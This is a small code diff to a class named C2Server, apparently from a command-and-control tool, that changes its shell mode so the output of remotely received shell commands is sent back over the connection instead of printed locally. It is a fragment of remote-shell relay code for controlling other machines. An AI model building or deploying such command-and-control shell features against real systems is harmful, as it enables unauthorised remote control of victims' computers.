@@ -26,6 +26,7 @@ class C2Server():
             return
 
         if self.shell_mode:
+
             if res == "exit":
                 self.shell_mode = False
                 instance.send("shell: Stopped")
@@ -33,8 +34,7 @@ class C2Server():
 
             shell = Shell(res)
             result = shell.run()
-            print(result)
-            instance.send("shell: Executed")
+            instance.send(f"shell>:\n {result['stdout']}")
             return
 
         instance.send("Command Executed")
